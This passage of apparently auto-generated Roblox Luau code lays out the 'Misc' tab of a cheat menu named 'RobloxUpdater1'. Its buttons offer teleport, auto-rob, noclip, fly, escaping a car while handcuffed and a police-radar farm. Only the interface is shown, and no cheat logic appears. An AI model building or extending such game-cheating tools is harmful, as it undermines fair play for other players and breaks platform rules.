UI["c6"]["Name"] = [[Click Sound]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Socials.CopyDiscord.ClickToCopy \\ --
UI["c7"] = Instance.new("LocalScript", UI["bf"])
UI["c7"]["Name"] = [[ClickToCopy]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc \\ --
UI["c8"] = Instance.new("Frame", UI["e"])
UI["c8"]["Visible"] = false
UI["c8"]["BorderSizePixel"] = 0
UI["c8"]["BackgroundColor3"] = Color3.fromRGB(27, 27, 27)
UI["c8"]["Size"] = UDim2.new(0, 444, 0, 262)
UI["c8"]["Position"] = UDim2.new(0.2262, 0, 0.15519, 0)
UI["c8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["c8"]["Name"] = [[Misc]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.UICorner \\ --
UI["c9"] = Instance.new("UICorner", UI["c8"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.Ãœberschrift \\ --
UI["ca"] = Instance.new("TextLabel", UI["c8"])
UI["ca"]["BorderSizePixel"] = 0
UI["ca"]["TextTransparency"] = 0.44
UI["ca"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["ca"]["TextSize"] = 28
UI["ca"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["ca"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["ca"]["BackgroundTransparency"] = 1
UI["ca"]["Size"] = UDim2.new(0, 444, 0, 28)
UI["ca"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["ca"]["Text"] = [[Misc Tab]]
UI["ca"]["Name"] = [[Ãœberschrift]]
UI["ca"]["Position"] = UDim2.new(0, 0, 0.03524, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.Ãœberschrift.UICorner \\ --
UI["cb"] = Instance.new("UICorner", UI["ca"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.Ãœberschrift.Underline \\ --
UI["cc"] = Instance.new("Frame", UI["ca"])
UI["cc"]["BorderSizePixel"] = 0
UI["cc"]["BackgroundColor3"] = Color3.fromRGB(60, 60, 60)
UI["cc"]["Size"] = UDim2.new(0, 199, 0, -2)
UI["cc"]["Position"] = UDim2.new(0.27378, 0, 1.25, 0)
UI["cc"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["cc"]["Name"] = [[Underline]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.UIGradient \\ --
UI["cd"] = Instance.new("UIGradient", UI["c8"])
UI["cd"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(78, 78, 78))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.Bank Status \\ --
UI["ce"] = Instance.new("TextLabel", UI["c8"])
UI["ce"]["BorderSizePixel"] = 0
UI["ce"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["ce"]["TextSize"] = 24
UI["ce"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["ce"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["ce"]["BackgroundTransparency"] = 1
UI["ce"]["Size"] = UDim2.new(0, 144, 0, 31)
UI["ce"]["Visible"] = false
UI["ce"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["ce"]["Text"] = [[Bank Status]]
UI["ce"]["Name"] = [[Bank Status]]
UI["ce"]["Position"] = UDim2.new(0.27252, 0, 0.28411, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.Underline \\ --
UI["cf"] = Instance.new("Frame", UI["c8"])
UI["cf"]["BorderSizePixel"] = 0
UI["cf"]["BackgroundColor3"] = Color3.fromRGB(60, 60, 60)
UI["cf"]["Size"] = UDim2.new(0, 3, 0, -193)
UI["cf"]["Position"] = UDim2.new(0.47297, 0, 0.96021, 0)
UI["cf"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["cf"]["Name"] = [[Underline]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2 \\ --
UI["d0"] = Instance.new("ScrollingFrame", UI["c8"])
UI["d0"]["Active"] = true
UI["d0"]["SizeConstraint"] = Enum.SizeConstraint.RelativeXX
UI["d0"]["BorderSizePixel"] = 0
UI["d0"]["CanvasSize"] = UDim2.new(0, 0, 1, 0)
UI["d0"]["AutoLocalize"] = false
UI["d0"]["MidImage"] = [[rbxassetid://88305916544750]]
UI["d0"]["VerticalScrollBarInset"] = Enum.ScrollBarInset.ScrollBar
UI["d0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["d0"]["Name"] = [[ScrollingFrame2]]
UI["d0"]["HorizontalScrollBarInset"] = Enum.ScrollBarInset.ScrollBar
UI["d0"]["AutomaticCanvasSize"] = Enum.AutomaticSize.XY
UI["d0"]["Size"] = UDim2.new(0, 223, 0, 193)
UI["d0"]["ScrollBarImageColor3"] = Color3.fromRGB(65, 215, 255)
UI["d0"]["Position"] = UDim2.new(0.47973, 0, 0.22357, 0)
UI["d0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["d0"]["ScrollBarThickness"] = 5
UI["d0"]["BackgroundTransparency"] = 1

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.teleport \\ --
UI["d1"] = Instance.new("TextButton", UI["d0"])
UI["d1"]["BorderSizePixel"] = 0
UI["d1"]["TextSize"] = 44
UI["d1"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["d1"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["d1"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["d1"]["Size"] = UDim2.new(0, 187, 0, 47)
UI["d1"]["BackgroundTransparency"] = 0.85
UI["d1"]["Name"] = [[teleport]]
UI["d1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["d1"]["Text"] = [[click tp]]
UI["d1"]["Position"] = UDim2.new(0.07276, 0, 0.05035, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.teleport.UICorner \\ --
UI["d2"] = Instance.new("UICorner", UI["d1"])
UI["d2"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.teleport.UIStroke \\ --
UI["d3"] = Instance.new("UIStroke", UI["d1"])
UI["d3"]["Transparency"] = 0.63
UI["d3"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["d3"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.teleport.click to tp \\ --
UI["d4"] = Instance.new("TextLabel", UI["d1"])
UI["d4"]["TextWrapped"] = true
UI["d4"]["BorderSizePixel"] = 0
UI["d4"]["TextTransparency"] = 0.32
UI["d4"]["TextScaled"] = true
UI["d4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["d4"]["TextSize"] = 74
UI["d4"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["d4"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["d4"]["BackgroundTransparency"] = 1
UI["d4"]["Size"] = UDim2.new(0, 192, 0, 17)
UI["d4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["d4"]["Text"] = [[ctrl + click = tp]]
UI["d4"]["Name"] = [[click to tp]]
UI["d4"]["Position"] = UDim2.new(0.02941, 0, 0.86472, 6)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.teleport.UIGradient \\ --
UI["d5"] = Instance.new("UIGradient", UI["d1"])
UI["d5"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.teleport.TPScript \\ --
UI["d6"] = Instance.new("LocalScript", UI["d1"])
UI["d6"]["Name"] = [[TPScript]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.teleport.animation \\ --
UI["d7"] = Instance.new("LocalScript", UI["d1"])
UI["d7"]["Name"] = [[animation]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.teleport.Click Sound \\ --
UI["d8"] = Instance.new("LocalScript", UI["d1"])
UI["d8"]["Name"] = [[Click Sound]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.Autorob \\ --
UI["d9"] = Instance.new("TextButton", UI["d0"])
UI["d9"]["BorderSizePixel"] = 0
UI["d9"]["TextSize"] = 37
UI["d9"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["d9"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["d9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["d9"]["Size"] = UDim2.new(0, 187, 0, 47)
UI["d9"]["BackgroundTransparency"] = 0.85
UI["d9"]["Name"] = [[Autorob]]
UI["d9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["d9"]["Text"] = [[Autorob]]
UI["d9"]["Position"] = UDim2.new(0.07526, 0, 0.50123, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.Autorob.TextLabel 1 \\ --
UI["da"] = Instance.new("TextLabel", UI["d9"])
UI["da"]["TextWrapped"] = true
UI["da"]["BorderSizePixel"] = 0
UI["da"]["TextTransparency"] = 0.32
UI["da"]["TextScaled"] = true
UI["da"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["da"]["TextSize"] = 74
UI["da"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["da"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["da"]["BackgroundTransparency"] = 1
UI["da"]["Size"] = UDim2.new(0, 189, 0, 17)
UI["da"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["da"]["Text"] = [[requires a key]]
UI["da"]["Name"] = [[TextLabel 1]]
UI["da"]["Position"] = UDim2.new(0, 0, 1.07083, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.Autorob.UIStroke \\ --
UI["db"] = Instance.new("UIStroke", UI["d9"])
UI["db"]["Transparency"] = 0.63
UI["db"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["db"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.Autorob.UICorner \\ --
UI["dc"] = Instance.new("UICorner", UI["d9"])
UI["dc"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.Autorob.UIGradient \\ --
UI["dd"] = Instance.new("UIGradient", UI["d9"])
UI["dd"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.Autorob.animation \\ --
UI["de"] = Instance.new("LocalScript", UI["d9"])
UI["de"]["Name"] = [[animation]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.Autorob.Click Sound \\ --
UI["df"] = Instance.new("LocalScript", UI["d9"])
UI["df"]["Name"] = [[Click Sound]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.Autorob.LocalScript \\ --
UI["e0"] = Instance.new("LocalScript", UI["d9"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.Noclip \\ --
UI["e1"] = Instance.new("TextButton", UI["d0"])
UI["e1"]["BorderSizePixel"] = 0
UI["e1"]["TextSize"] = 37
UI["e1"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["e1"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["e1"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["e1"]["Size"] = UDim2.new(0, 187, 0, 47)
UI["e1"]["BackgroundTransparency"] = 0.85
UI["e1"]["Name"] = [[Noclip]]
UI["e1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["e1"]["Text"] = [[Noclip: OFF]]
UI["e1"]["Position"] = UDim2.new(0.10613, 0, 1.351, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.Noclip.TextLabel 1 \\ --
UI["e2"] = Instance.new("TextLabel", UI["e1"])
UI["e2"]["TextWrapped"] = true
UI["e2"]["BorderSizePixel"] = 0
UI["e2"]["TextTransparency"] = 0.32
UI["e2"]["TextScaled"] = true
UI["e2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["e2"]["TextSize"] = 74
UI["e2"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["e2"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["e2"]["BackgroundTransparency"] = 1
UI["e2"]["Size"] = UDim2.new(0, 189, 0, 17)
UI["e2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["e2"]["Text"] = [[running through walls]]
UI["e2"]["Name"] = [[TextLabel 1]]
UI["e2"]["Position"] = UDim2.new(0, 0, 1.07083, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.Noclip.UIStroke \\ --
UI["e3"] = Instance.new("UIStroke", UI["e1"])
UI["e3"]["Transparency"] = 0.63
UI["e3"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["e3"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.Noclip.UICorner \\ --
UI["e4"] = Instance.new("UICorner", UI["e1"])
UI["e4"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.Noclip.UIGradient \\ --
UI["e5"] = Instance.new("UIGradient", UI["e1"])
UI["e5"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.Noclip.animation \\ --
UI["e6"] = Instance.new("LocalScript", UI["e1"])
UI["e6"]["Name"] = [[animation]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.Noclip.Click Sound \\ --
UI["e7"] = Instance.new("LocalScript", UI["e1"])
UI["e7"]["Name"] = [[Click Sound]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.Noclip.LocalScript \\ --
UI["e8"] = Instance.new("LocalScript", UI["e1"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.Respawn \\ --
UI["e9"] = Instance.new("TextButton", UI["d0"])
UI["e9"]["BorderSizePixel"] = 0
UI["e9"]["TextSize"] = 37
UI["e9"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["e9"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["e9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["e9"]["Size"] = UDim2.new(0, 187, 0, 47)
UI["e9"]["BackgroundTransparency"] = 0.85
UI["e9"]["Name"] = [[Respawn]]
UI["e9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["e9"]["Text"] = [[Respawn]]
UI["e9"]["Position"] = UDim2.new(0.10348, 0, 1.78605, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.Respawn.TextLabel 1 \\ --
UI["ea"] = Instance.new("TextLabel", UI["e9"])
UI["ea"]["TextWrapped"] = true
UI["ea"]["BorderSizePixel"] = 0
UI["ea"]["TextTransparency"] = 0.32
UI["ea"]["TextScaled"] = true
UI["ea"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["ea"]["TextSize"] = 74
UI["ea"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["ea"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["ea"]["BackgroundTransparency"] = 1
UI["ea"]["Size"] = UDim2.new(0, 189, 0, 17)
UI["ea"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["ea"]["Text"] = [[lose all weapons]]
UI["ea"]["Name"] = [[TextLabel 1]]
UI["ea"]["Position"] = UDim2.new(0, 0, 1.07083, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.Respawn.UIStroke \\ --
UI["eb"] = Instance.new("UIStroke", UI["e9"])
UI["eb"]["Transparency"] = 0.63
UI["eb"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["eb"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.Respawn.UICorner \\ --
UI["ec"] = Instance.new("UICorner", UI["e9"])
UI["ec"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.Respawn.UIGradient \\ --
UI["ed"] = Instance.new("UIGradient", UI["e9"])
UI["ed"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.Respawn.animation \\ --
UI["ee"] = Instance.new("LocalScript", UI["e9"])
UI["ee"]["Name"] = [[animation]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.Respawn.Click Sound \\ --
UI["ef"] = Instance.new("LocalScript", UI["e9"])
UI["ef"]["Name"] = [[Click Sound]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.Respawn.LocalScript \\ --
UI["f0"] = Instance.new("LocalScript", UI["e9"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.ExitCar \\ --
UI["f1"] = Instance.new("TextButton", UI["d0"])
UI["f1"]["BorderSizePixel"] = 0
UI["f1"]["TextSize"] = 37
UI["f1"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["f1"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["f1"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["f1"]["Size"] = UDim2.new(0, 187, 0, 47)
UI["f1"]["BackgroundTransparency"] = 0.85
UI["f1"]["Name"] = [[ExitCar]]
UI["f1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["f1"]["Text"] = [[Exit car]]
UI["f1"]["Position"] = UDim2.new(0.07276, 0, 0.92523, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.ExitCar.TextLabel 1 \\ --
UI["f2"] = Instance.new("TextLabel", UI["f1"])
UI["f2"]["TextWrapped"] = true
UI["f2"]["BorderSizePixel"] = 0
UI["f2"]["TextTransparency"] = 0.32
UI["f2"]["TextScaled"] = true
UI["f2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["f2"]["TextSize"] = 74
UI["f2"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["f2"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["f2"]["BackgroundTransparency"] = 1
UI["f2"]["Size"] = UDim2.new(0, 189, 0, 17)
UI["f2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["f2"]["Text"] = [[Exit a car while handcuffed]]
UI["f2"]["Name"] = [[TextLabel 1]]
UI["f2"]["Position"] = UDim2.new(0, 0, 1.07083, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.ExitCar.UIStroke \\ --
UI["f3"] = Instance.new("UIStroke", UI["f1"])
UI["f3"]["Transparency"] = 0.63
UI["f3"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["f3"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.ExitCar.UICorner \\ --
UI["f4"] = Instance.new("UICorner", UI["f1"])
UI["f4"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.ExitCar.UIGradient \\ --
UI["f5"] = Instance.new("UIGradient", UI["f1"])
UI["f5"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.ExitCar.animation \\ --
UI["f6"] = Instance.new("LocalScript", UI["f1"])
UI["f6"]["Name"] = [[animation]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.ExitCar.Click Sound \\ --
UI["f7"] = Instance.new("LocalScript", UI["f1"])
UI["f7"]["Name"] = [[Click Sound]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.ExitCar.LocalScript \\ --
UI["f8"] = Instance.new("LocalScript", UI["f1"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.UIListLayout \\ --
UI["f9"] = Instance.new("UIListLayout", UI["d0"])
UI["f9"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center
UI["f9"]["Padding"] = UDim.new(0, 40)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.UIPadding \\ --
UI["fa"] = Instance.new("UIPadding", UI["d0"])
UI["fa"]["PaddingTop"] = UDim.new(0, 7)
UI["fa"]["PaddingBottom"] = UDim.new(0, 20)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.AutoRadar \\ --
UI["fb"] = Instance.new("TextButton", UI["d0"])
UI["fb"]["TextWrapped"] = true
UI["fb"]["BorderSizePixel"] = 0
UI["fb"]["TextSize"] = 44
UI["fb"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["fb"]["TextScaled"] = true
UI["fb"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["fb"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["fb"]["Size"] = UDim2.new(0, 187, 0, 47)
UI["fb"]["BackgroundTransparency"] = 0.85
UI["fb"]["Name"] = [[AutoRadar]]
UI["fb"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["fb"]["Text"] = [[Autoradar: AUS]]
UI["fb"]["Position"] = UDim2.new(0.19731, 0, -2.11446, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.AutoRadar.UICorner \\ --
UI["fc"] = Instance.new("UICorner", UI["fb"])
UI["fc"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.AutoRadar.UIStroke \\ --
UI["fd"] = Instance.new("UIStroke", UI["fb"])
UI["fd"]["Transparency"] = 0.63
UI["fd"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["fd"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.AutoRadar.click to tp \\ --
UI["fe"] = Instance.new("TextLabel", UI["fb"])
UI["fe"]["TextWrapped"] = true
UI["fe"]["BorderSizePixel"] = 0
UI["fe"]["TextTransparency"] = 0.32
UI["fe"]["TextScaled"] = true
UI["fe"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["fe"]["TextSize"] = 74
UI["fe"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["fe"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["fe"]["BackgroundTransparency"] = 1
UI["fe"]["Size"] = UDim2.new(0, 197, 0, 17)
UI["fe"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["fe"]["Text"] = [[police radar farm]]
UI["fe"]["Name"] = [[click to tp]]
UI["fe"]["Position"] = UDim2.new(0, 0, 0.86472, 6)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.AutoRadar.UIGradient \\ --
UI["ff"] = Instance.new("UIGradient", UI["fb"])
UI["ff"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.AutoRadar.animation \\ --
UI["100"] = Instance.new("LocalScript", UI["fb"])
UI["100"]["Name"] = [[animation]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.AutoRadar.Click Sound \\ --
UI["101"] = Instance.new("LocalScript", UI["fb"])
UI["101"]["Name"] = [[Click Sound]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame2.AutoRadar.AutoradarScript \\ --
UI["102"] = Instance.new("LocalScript", UI["fb"])
UI["102"]["Name"] = [[AutoradarScript]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame1 \\ --
UI["103"] = Instance.new("ScrollingFrame", UI["c8"])
UI["103"]["Active"] = true
UI["103"]["SizeConstraint"] = Enum.SizeConstraint.RelativeXX
UI["103"]["BorderSizePixel"] = 0
UI["103"]["CanvasSize"] = UDim2.new(0, 0, 1, 0)
UI["103"]["AutoLocalize"] = false
UI["103"]["MidImage"] = [[rbxassetid://88305916544750]]
UI["103"]["VerticalScrollBarInset"] = Enum.ScrollBarInset.ScrollBar
UI["103"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["103"]["Name"] = [[ScrollingFrame1]]
UI["103"]["HorizontalScrollBarInset"] = Enum.ScrollBarInset.ScrollBar
UI["103"]["AutomaticCanvasSize"] = Enum.AutomaticSize.XY
UI["103"]["Size"] = UDim2.new(0, 210, 0, 193)
UI["103"]["ScrollBarImageColor3"] = Color3.fromRGB(65, 215, 255)
UI["103"]["Position"] = UDim2.new(-0.00125, 0, 0.22357, 0)
UI["103"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["103"]["ScrollBarThickness"] = 5
UI["103"]["BackgroundTransparency"] = 1

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame1.Fly \\ --
UI["104"] = Instance.new("TextButton", UI["103"])
UI["104"]["BorderSizePixel"] = 0
UI["104"]["TextSize"] = 37
UI["104"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["104"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["104"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["104"]["Size"] = UDim2.new(0, 187, 0, 56)
UI["104"]["BackgroundTransparency"] = 0.85
UI["104"]["Name"] = [[Fly]]
UI["104"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["104"]["Text"] = [[Fly]]
UI["104"]["Position"] = UDim2.new(0.04521, 0, 0.56459, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame1.Fly.TextLabel 1 \\ --
UI["105"] = Instance.new("TextLabel", UI["104"])
UI["105"]["TextWrapped"] = true
UI["105"]["BorderSizePixel"] = 0
UI["105"]["TextTransparency"] = 0.32
UI["105"]["TextScaled"] = true
UI["105"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["105"]["TextSize"] = 74
UI["105"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["105"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["105"]["BackgroundTransparency"] = 1
UI["105"]["Size"] = UDim2.new(0, 193, 0, 17)
UI["105"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["105"]["Text"] = [[toggle with V]]
UI["105"]["Name"] = [[TextLabel 1]]
UI["105"]["Position"] = UDim2.new(0, 0, 1.07083, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame1.Fly.UIStroke \\ --
UI["106"] = Instance.new("UIStroke", UI["104"])
UI["106"]["Transparency"] = 0.63
UI["106"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["106"]["Thickness"] = 1.7

